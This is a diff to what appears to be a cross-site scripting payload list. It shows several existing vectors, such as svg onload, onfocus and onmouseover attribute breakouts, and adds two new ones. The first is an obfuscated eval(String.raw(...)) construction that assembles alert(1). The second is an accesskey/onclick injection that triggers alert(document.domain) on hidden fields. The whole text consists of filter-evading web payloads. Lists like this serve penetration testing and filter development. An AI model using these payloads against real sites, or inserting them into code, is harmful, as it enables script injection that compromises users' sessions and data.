@@ -49,6 +49,7 @@ autofocus onfocus=window.onerror=alert;throw/1/;//
 <svg/onload=window.onerror=alert;throw/1/;>
 <script> $=1, alert($) </script>
 <script> (alert) (1) </script>
+<script> eval(String.raw({[`raw`]:`aet(1)`},...`lr`)) </script>
 
 
                                                        
@@ -90,6 +91,7 @@ autofocus onfocus=window.onerror=alert;throw/1/;//
 "onmouseover="alert(1);"
 "/onmouseover= alert(1)>
 "onload="alert(1)""
+strukt" accesskey="X" onclick="alert(document.domain) //ALT+SHIFT+X to trigger, works for hidden fields
                                                         
 															
 /*HTML5 popular vectors*/
